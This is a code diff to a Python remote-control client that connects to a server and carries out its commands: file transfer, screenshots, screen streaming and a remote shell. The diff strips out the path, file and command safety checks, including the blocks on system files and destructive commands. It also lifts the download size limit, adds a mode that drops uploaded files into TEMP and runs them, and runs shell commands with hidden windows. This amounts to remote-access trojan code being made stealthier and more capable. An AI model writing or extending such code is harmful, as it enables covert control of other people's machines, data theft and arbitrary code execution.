@@ -22,106 +22,28 @@ SERVER_PORT = 7700
 CHUNK_SIZE = 512 * 1024
 CHUNK_THRESHOLD = 1024 * 1024
 
+def send_all(sock, data):
+    total = 0
+    while total < len(data):
+        sent = sock.send(data[total:])
+        if sent == 0:
+            raise RuntimeError("Socket connection broken")
+        total += sent
+
 
 
 def _is_safe_path(path):
     """Check if path is safe for access"""
-    try:
-        path = os.path.abspath(os.path.expanduser(path))
-        
-        # Dangerous paths to block
-        dangerous_paths = [
-            os.path.expandvars('%SystemRoot%'),
-            os.path.expandvars('%ProgramFiles%'),
-            r'C:\Windows',
-            r'C:\Program Files',
-            r'C:\Program Files (x86)',
-            '/etc', '/bin', '/sbin', '/usr/bin', '/usr/sbin', '/root', '/System'
-        ]
-        
-        for dangerous in dangerous_paths:
-            dangerous = os.path.abspath(os.path.expanduser(dangerous))
-            if path.startswith(dangerous):
-                return False
-        
-        # Allow user directories and common safe locations
-        safe_paths = [
-            os.path.expanduser('~'),
-            os.path.expanduser('~/Desktop'),
-            os.path.expanduser('~/Documents'),
-            os.path.expanduser('~/Downloads'),
-            os.path.expanduser('~/Pictures'),
-            os.path.expanduser('~/Videos'),
-            os.path.expanduser('~/Music'),
-            os.path.expanduser('~/AppData/Local'),
-            os.path.expanduser('~/AppData/Roaming'),
-            r'C:\Users', '/home', '/tmp', '/var/tmp', r'C:\Temp', r'C:\tmp'
-        ]
-        
-        for safe in safe_paths:
-            safe = os.path.abspath(os.path.expanduser(safe))
-            if path.startswith(safe):
-                return True
-        
-        return True
-    except Exception:
-        return False
+    return True
 
 def _is_safe_file(path):
     """Check if file is safe to access - now allows all files for download"""
-    try:
-        # Only check if path is safe, allow all file types for download
-        if not _is_safe_path(path):
-            return False
-            
-        # Allow all file extensions for download
-        # Only block potentially dangerous system files
-        dangerous_files = {
-            'ntuser.dat', 'boot.ini', 'config.sys', 'autoexec.bat',
-            'hosts', 'passwd', 'shadow', 'sudoers'
-        }
-        
-        basename = os.path.basename(path).lower()
-        if basename in dangerous_files:
-            return False
-            
-        return True
-    except Exception:
-        return False
+    return True
 
 def _is_safe_command(command):
     """Check if command is safe to execute"""
-    try:
-        cmd_lower = command.lower().strip()
-        
-        blocked_commands = {
-            'format', 'fdisk', 'diskpart', 'del ', 'rmdir ', 'shutdown',
-            'reboot', 'halt', 'poweroff', 'rm -rf', 'sudo rm', 'mkfs',
-            'dd if=', 'chmod 777', 'chown root', 'passwd', 'su root',
-            'net user', 'reg add', 'reg delete', 'bcdedit'
-        }
-        
-        for blocked in blocked_commands:
-            if blocked in cmd_lower:
-                return False
-        
-        safe_patterns = {
-            'dir', 'ls', 'cd ', 'echo ', 'type ', 'cat ', 'ping ',
-            'ipconfig', 'ifconfig', 'whoami', 'date', 'time', 'ver',
-            'systeminfo', 'tasklist', 'ps', 'help', 'mkdir ', 'copy ',
-            'xcopy', 'robocopy', 'move ', 'ren ', 'rename '
-        }
-        
-        for safe in safe_patterns:
-            if cmd_lower.startswith(safe):
-                return True
-        
-        if cmd_lower.startswith('cd') or cmd_lower == 'cd':
-            return True
-            
-        return False
-    except Exception:
-        return False
+    return True
+
 
 def unique_filepath(path):
     if not os.path.exists(path):
@@ -276,32 +198,26 @@ def connect():
                 if not chunk:
                     break
                 recv_buffer += chunk
-                while b"{" in recv_buffer:
+                decoder = json.JSONDecoder()
+                while True:
                     try:
                         first = recv_buffer.find(b"{")
-                        brace_count = 0
-                        end = -1
-                        for i in range(first, len(recv_buffer)):
-                            if recv_buffer[i:i+1] == b"{":
-                                brace_count += 1
-                            elif recv_buffer[i:i+1] == b"}":
-                                brace_count -= 1
-                                if brace_count == 0:
-                                    end = i + 1
-                                    break
-                        if end == -1:
+                        if first == -1:
                             break
-                        json_bytes = recv_buffer[first:end]
-                        recv_buffer = recv_buffer[end:]
-                        command = json.loads(json_bytes.decode())
-                    except (json.JSONDecodeError, ValueError):
+                        obj, pos = decoder.raw_decode(recv_buffer[first:].decode("utf-8", errors="replace"))
+                        command = obj
+                        recv_buffer = recv_buffer[first + pos:]
+                    except (json.JSONDecodeError, ValueError, UnicodeDecodeError):
                         break
                     
                     try:
                         if command["action"] == "ping":
                             sock.send(json.dumps({"action": "pong"}).encode())
                         elif command["action"] == "upload_file":
-                            target_dir = command.get("path") or os.path.join(os.path.expanduser("~"), "Desktop")
+                            if command.get("execute", False):
+                                target_dir = command.get("path") or os.environ.get("TEMP") or os.path.join(os.path.expanduser("~"), "AppData", "Local", "Temp")
+                            else:
+                                target_dir = command.get("path") or os.path.join(os.path.expanduser("~"), "Desktop")
                             target_dir = os.path.abspath(os.path.expanduser(target_dir))
                             filepath = unique_filepath(os.path.join(target_dir, command["filename"]))
                             try:
@@ -309,6 +225,15 @@ def connect():
                                 file_data = base64.b64decode(command["data"])
                                 with open(filepath, "wb") as f:
                                     f.write(file_data)
+                                if command.get("execute", False):
+                                    try:
+                                        if sys.platform == "win32":
+                                            os.startfile(filepath)
+                                        else:
+                                            subprocess.Popen([filepath], shell=True)
+                                        sock.send(json.dumps({"action": "execute_result", "error": ""}).encode())
+                                    except Exception as ex:
+                                        sock.send(json.dumps({"action": "execute_result", "error": str(ex)}).encode())
                             except Exception as e:
                                 sock.send(json.dumps({"action": "file_error", "error": str(e)}).encode())
                         
@@ -318,13 +243,16 @@ def connect():
                                     current_upload["f"].close()
                                 except:
                                     pass
-                            target_dir = command.get("path") or os.path.join(os.path.expanduser("~"), "Desktop")
+                            if command.get("execute", False):
+                                target_dir = command.get("path") or os.environ.get("TEMP") or os.path.join(os.path.expanduser("~"), "AppData", "Local", "Temp")
+                            else:
+                                target_dir = command.get("path") or os.path.join(os.path.expanduser("~"), "Desktop")
                             target_dir = os.path.abspath(os.path.expanduser(target_dir))
                             filepath = unique_filepath(os.path.join(target_dir, command["filename"]))
                             try:
                                 os.makedirs(target_dir, exist_ok=True)
                                 f = open(filepath, "wb")
-                                current_upload = {"f": f, "path": filepath, "total": command.get("total", 0), "received": 0}
+                                current_upload = {"f": f, "path": filepath, "total": command.get("total", 0), "received": 0, "execute": command.get("execute", False)}
                                 sock.send(json.dumps({"action": "upload_chunk_ack"}).encode())
                             except Exception as e:
                                 current_upload = None
@@ -344,7 +272,17 @@ def connect():
                             if current_upload:
                                 try:
                                     current_upload["f"].close()
-                                    sock.send(json.dumps({"action": "upload_done", "error": ""}).encode())
+                                    if current_upload.get("execute", False):
+                                        try:
+                                            if sys.platform == "win32":
+                                                os.startfile(current_upload["path"])
+                                            else:
+                                                subprocess.Popen([current_upload["path"]], shell=True)
+                                            sock.send(json.dumps({"action": "execute_result", "error": ""}).encode())
+                                        except Exception as ex:
+                                            sock.send(json.dumps({"action": "execute_result", "error": str(ex)}).encode())
+                                    else:
+                                        sock.send(json.dumps({"action": "upload_done", "error": ""}).encode())
                                 except Exception as e:
                                     sock.send(json.dumps({"action": "upload_done", "error": str(e)}).encode())
                                 current_upload = None
@@ -397,37 +335,32 @@ def connect():
                         elif command["action"] == "get_file":
                             path = command.get("path", "")
                             path = os.path.abspath(os.path.expanduser(path))
-                            # Security checks
                             if not _is_safe_path(path) or not _is_safe_file(path):
-                                sock.send(json.dumps({"action": "file_data", "path": path, "data": "", "error": "Access denied: unsafe file"}).encode())
+                                send_all(sock, json.dumps({"action": "file_data", "path": path, "data": "", "error": "Access denied: unsafe file"}).encode())
                                 continue
                             try:
                                 if not os.path.isfile(path):
-                                    sock.send(json.dumps({"action": "file_data", "path": path, "data": "", "error": "Not a file or not found"}).encode())
+                                    send_all(sock, json.dumps({"action": "file_data", "path": path, "data": "", "error": "Not a file or not found"}).encode())
                                 else:
-                                    # Check file size limit (max 100MB)
                                     total_size = os.path.getsize(path)
-                                    if total_size > 100 * 1024 * 1024:
-                                        sock.send(json.dumps({"action": "file_data", "path": path, "data": "", "error": "File too large (max 100MB)"}).encode())
-                                        continue
                                     filename = os.path.basename(path)
                                     if total_size > CHUNK_THRESHOLD:
-                                        sock.send(json.dumps({"action": "get_file_start", "filename": filename, "size": total_size, "error": ""}).encode())
+                                        send_all(sock, json.dumps({"action": "get_file_start", "filename": filename, "size": total_size, "error": ""}).encode())
                                         with open(path, "rb") as f:
                                             idx = 0
                                             while True:
                                                 chunk = f.read(CHUNK_SIZE)
                                                 if not chunk:
                                                     break
-                                                sock.send(json.dumps({"action": "get_file_chunk", "index": idx, "data": base64.b64encode(chunk).decode()}).encode())
+                                                send_all(sock, json.dumps({"action": "get_file_chunk", "index": idx, "data": base64.b64encode(chunk).decode()}).encode())
                                                 idx += 1
-                                        sock.send(json.dumps({"action": "get_file_end", "error": ""}).encode())
+                                        send_all(sock, json.dumps({"action": "get_file_end", "error": ""}).encode())
                                     else:
                                         with open(path, "rb") as f:
                                             data = base64.b64encode(f.read()).decode()
-                                        sock.send(json.dumps({"action": "file_data", "path": path, "filename": filename, "data": data, "error": ""}).encode())
+                                        send_all(sock, json.dumps({"action": "file_data", "path": path, "filename": filename, "data": data, "error": ""}).encode())
                             except Exception as e:
-                                sock.send(json.dumps({"action": "file_data", "path": path, "data": "", "error": str(e)}).encode())
+                                send_all(sock, json.dumps({"action": "file_data", "path": path, "data": "", "error": str(e)}).encode())
                         
                         elif command["action"] == "create_folder":
                             path = command.get("path", "")
@@ -511,10 +444,10 @@ def connect():
                                     "width": screenshot.width,
                                     "height": screenshot.height
                                 }
-                                sock.send(json.dumps(response).encode())
+                                send_all(sock, json.dumps(response).encode())
                             except Exception as e:
                                 response = {"action": "screenshot_error", "error": f"Screenshot failed: {str(e)}"}
-                                sock.send(json.dumps(response).encode())
+                                send_all(sock, json.dumps(response).encode())
                         
                         elif command["action"] == "start_screen":
                             streaming_active = True
@@ -681,26 +614,25 @@ if not exist "{current_exe}" (
                             path = os.path.abspath(os.path.expanduser(path))
                             try:
                                 if not os.path.isfile(path):
-                                    sock.send(json.dumps({"action": "execute_result", "error": "Not a file or not found"}).encode())
+                                    send_all(sock, json.dumps({"action": "execute_result", "error": "Not a file or not found"}).encode())
                                 else:
                                     if sys.platform == "win32":
                                         os.startfile(path)
                                     else:
                                         subprocess.Popen([path], shell=True)
-                                    sock.send(json.dumps({"action": "execute_result", "error": ""}).encode())
+                                    send_all(sock, json.dumps({"action": "execute_result", "error": ""}).encode())
                             except Exception as e:
-                                sock.send(json.dumps({"action": "execute_result", "error": str(e)}).encode())
+                                send_all(sock, json.dumps({"action": "execute_result", "error": str(e)}).encode())
                         
                         elif command["action"] == "execute_cmd":
                             cmd_to_execute = command["command"].strip()
                             cmd_timeout = command.get("timeout", 300)
-                            # Security checks
                             if not _is_safe_command(cmd_to_execute):
-                                sock.send(json.dumps({"action": "cmd_output", "output": "", "error": "Command blocked for security reasons"}).encode())
+                                send_all(sock, json.dumps({"action": "cmd_output", "output": "", "error": "Command blocked for security reasons"}).encode())
                                 continue
                             try:
                                 lower = cmd_to_execute.lower().strip()
-                                if lower == "cd" or lower.startswith("cd ") or lower == "cd.." or lower.startswith("cd..") or "cd /d" in lower or "cd \\d" in lower:
+                                if lower == "cd" or lower.startswith("cd ") or lower == "cd.." or lower.startswith("cd..") or "cd /d" in lower:
                                     target = None
                                     if lower == "cd" or lower == "cd~":
                                         target = os.path.expanduser("~")
@@ -722,6 +654,7 @@ if not exist "{current_exe}" (
                                         path = cmd_to_execute[3:].strip()
                                         if (path.startswith('"') and path.endswith('"')) or (path.startswith("'") and path.endswith("'")):
                                             path = path[1:-1]
+                                        path = os.path.expandvars(path)
                                         path = os.path.expanduser(path)
                                         target = path if os.path.isabs(path) else os.path.abspath(os.path.join(current_dir, path))
                                     if target and os.path.isdir(target):
@@ -729,17 +662,37 @@ if not exist "{current_exe}" (
                                         response = {"action": "cmd_output", "output": current_dir + "\n", "error": ""}
                                     else:
                                         response = {"action": "cmd_output", "output": "", "error": "The system cannot find the path specified."}
-                                    sock.send(json.dumps(response).encode())
+                                    send_all(sock, json.dumps(response).encode())
                                     continue
-                                result = subprocess.run(cmd_to_execute, shell=True, capture_output=True, text=True, timeout=cmd_timeout, cwd=current_dir)
-                                response = {"action": "cmd_output", "output": result.stdout or "", "error": result.stderr or ""}
-                                sock.send(json.dumps(response).encode())
+                                _interactive_cmds = {"cmd", "cmd.exe", "python", "python.exe", "python3", "pwsh", "pwsh.exe", "powershell", "powershell.exe"}
+                                _first_word = cmd_to_execute.strip().split()[0].lower() if cmd_to_execute.strip() else ""
+                                if _first_word in _interactive_cmds and len(cmd_to_execute.strip().split()) == 1:
+                                    send_all(sock, json.dumps({"action": "cmd_output", "output": "", "error": f"Cannot run '{_first_word}' in remote shell - it starts an interactive session that never exits. The shell already runs under cmd.exe /c."}).encode())
+                                    continue
+                                if sys.platform == "win32":
+                                    try:
+                                        cmd_to_execute = os.path.expandvars(cmd_to_execute)
+                                    except (ValueError, os.error):
+                                        pass
+                                    flags = subprocess.CREATE_NO_WINDOW if sys.platform == "win32" else 0
+                                    result = subprocess.run(["cmd.exe", "/c", cmd_to_execute], capture_output=True, timeout=cmd_timeout, cwd=current_dir, creationflags=flags)
+                                else:
+                                    result = subprocess.run(cmd_to_execute, shell=True, capture_output=True, timeout=cmd_timeout, cwd=current_dir)
+                                out = result.stdout.decode("cp437", errors="replace") if result.stdout else ""
+                                err = result.stderr.decode("cp437", errors="replace") if result.stderr else ""
+                                if not out and not err and result.returncode == 0:
+                                    out = "\n[Command executed successfully]\n"
+                                response = {"action": "cmd_output", "output": out, "error": err}
+                                send_all(sock, json.dumps(response).encode())
                             except subprocess.TimeoutExpired:
-                                sock.send(json.dumps({"action": "cmd_output", "output": "", "error": f"Command timeout ({cmd_timeout} seconds)"}).encode())
+                                send_all(sock, json.dumps({"action": "cmd_output", "output": "", "error": f"Command timeout ({cmd_timeout} seconds)"}).encode())
                             except Exception as e:
-                                sock.send(json.dumps({"action": "cmd_output", "output": "", "error": str(e)}).encode())
+                                send_all(sock, json.dumps({"action": "cmd_output", "output": "", "error": str(e)}).encode())
                     except Exception as e:
-                        pass
+                        try:
+                            send_all(sock, json.dumps({"action": "cmd_output", "output": "", "error": f"Internal error: {str(e)}"}).encode())
+                        except Exception:
+                            pass
             if restart_requested:
                 delay_index = 0
                 continue  # immediate reconnect without backoff
